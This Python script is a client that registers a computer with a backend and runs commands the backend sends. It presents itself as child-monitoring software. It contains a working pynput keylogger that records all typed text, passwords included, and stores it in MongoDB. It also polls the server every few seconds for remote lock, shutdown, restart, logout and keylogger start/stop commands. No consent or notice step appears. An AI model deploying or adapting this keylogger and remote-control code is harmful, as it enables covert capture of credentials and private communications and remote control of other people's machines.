"""
CLIENT SCRIPT - Runs on child's computer and syncs with MongoDB
Registers device and executes commands from the backend
"""
import requests
import json
import time
import threading
import socket
import os
import platform
from datetime import datetime
from pymongo import MongoClient
from pynput import keyboard

# Configuration
BACKEND_URL = "http://localhost:5000"  # Change to your server IP:port
DEVICE_ID = socket.gethostname()
DEVICE_NAME = f"{platform.node()} - {platform.system()}"

# MongoDB Connection (optional - for direct connection)
MONGO_URI = "mongodb://localhost:27017/"
DB_NAME = "child_monitoring"
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
keystrokes_col = db["keystrokes"]

# Global variables
keylogger_running = False
captured_text = ""
listener = None

# ==================== KEYSTROKE LOGGING ====================

def on_press(key):
    """Capture keystrokes"""
    global captured_text, keylogger_running
    
    if not keylogger_running:
        return False
    
    try:
        if key.char and key.char.isprintable():
            captured_text += key.char
            print(f"Key: {key.char}")
        else:
            if key == keyboard.Key.space:
                captured_text += " "
            elif key == keyboard.Key.enter:
                send_keystrokes()
            elif key == keyboard.Key.backspace:
                captured_text = captured_text[:-1]
            else:
                captured_text += f"[{key}]"
    except AttributeError:
        pass

def send_keystrokes():
    """Send keystrokes to backend"""
    global captured_text
    
    if captured_text:
        try:
            keystroke_doc = {
                "device_id": DEVICE_ID,
                "text": captured_text,
                "created_at": datetime.now()
            }
            keystrokes_col.insert_one(keystroke_doc)
            print(f"Sent keystrokes: {captured_text}")
            captured_text = ""
        except Exception as e:
            print(f"Error sending keystrokes: {e}")

def start_keylogger():
    """Start keystroke listener"""
    global keylogger_running, listener
    
    if keylogger_running:
        return
    
    keylogger_running = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keylogger started")

def stop_keylogger():
    """Stop keystroke listener"""
    global keylogger_running, listener
    
    keylogger_running = False
    if listener:
        listener.stop()
        listener = None
    print("Keylogger stopped")

# ==================== DEVICE REGISTRATION ====================

def register_device():
    """Register device with backend"""
    try:
        data = {
            "device_id": DEVICE_ID,
            "device_name": DEVICE_NAME
        }
        response = requests.post(f"{BACKEND_URL}/api/register-device", json=data, timeout=5)
        if response.status_code == 200:
            print(f"Device registered: {response.json()}")
            return True
        else:
            print(f"Registration failed: {response.text}")
            return False
    except Exception as e:
        print(f"Error registering device: {e}")
        return False

# ==================== COMMAND EXECUTION ====================

def check_pending_commands():
    """Check for pending commands from backend"""
    try:
        response = requests.get(
            f"{BACKEND_URL}/api/commands/pending/{DEVICE_ID}",
            timeout=5
        )
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands:
                execute_command(cmd)
    except Exception as e:
        print(f"Error checking commands: {e}")

def execute_command(cmd):
    """Execute command received from backend"""
    command_type = cmd.get('command')
    command_id = cmd.get('_id')
    params = cmd.get('params', {})
    
    print(f"Executing command: {command_type}")
    
    try:
        if command_type == "lock":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        
        elif command_type == "shutdown":
            os.system("shutdown /s /t 10")
        
        elif command_type == "restart":
            os.system("shutdown /r /t 10")
        
        elif command_type == "logout":
            os.system("shutdown -l")
        
        elif command_type == "keystrokes_start":
            start_keylogger()
        
        elif command_type == "keystrokes_stop":
            stop_keylogger()
        
        # Mark command as executed
        requests.post(f"{BACKEND_URL}/api/command/executed/{command_id}")
        
    except Exception as e:
        print(f"Error executing command: {e}")

# ==================== MAIN LOOP ====================

def sync_loop():
    """Continuously sync with backend"""
    while True:
        try:
            check_pending_commands()
            time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            print(f"Sync error: {e}")
            time.sleep(10)

def main():
    """Main function"""
    print(f"Starting client for device: {DEVICE_ID}")
    
    # Register device
    if not register_device():
        print("Failed to register device. Retrying in 10 seconds...")
        time.sleep(10)
        return
    
    # Start sync thread
    sync_thread = threading.Thread(target=sync_loop, daemon=True)
    sync_thread.start()
    
    # Keep the script running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Shutting down client...")
        stop_keylogger()

if __name__ == "__main__":
    main()
